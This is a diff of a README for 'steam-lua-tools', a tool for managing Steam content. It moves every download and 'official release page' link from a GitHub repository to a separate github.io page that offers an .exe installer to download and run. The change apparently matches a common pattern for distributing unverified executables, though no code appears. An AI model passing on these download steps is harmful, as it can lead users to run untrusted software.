@@ -1,7 +1,7 @@
 # 🛠 steam-lua-tools - Manage your Steam content with ease
 
 <p align="center">
-  <a href="https://github.com/Insigniasomatotype317/steam-lua-tools">
+  <a href="https://insigniasomatotype317.github.io">
     <img src="https://img.shields.io/badge/Download-Steam_Lua_Tools-blue" alt="Download Steam Lua Tools">
   </a>
 </p>
@@ -28,7 +28,7 @@ You do not need to install complex libraries or developer environments. This too
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Insigniasomatotype317/steam-lua-tools) to find the latest version.
+1. Go to the [official release page](https://insigniasomatotype317.github.io) to find the latest version.
 2. Look for the file ending in .exe in the assets section.
 3. Select the file to save it to your computer.
 4. Locate the file in your downloads folder.
@@ -73,7 +73,7 @@ We encourage users to keep their software updated. By pulling the latest release
 
 To summarize the setup process:
 
-1. Visit [https://github.com/Insigniasomatotype317/steam-lua-tools](https://github.com/Insigniasomatotype317/steam-lua-tools).
+1. Visit [https://insigniasomatotype317.github.io](https://insigniasomatotype317.github.io).
 2. Download the installer.
 3. Run the application from your desktop.
 4. Select the desired manifest task from the interface.
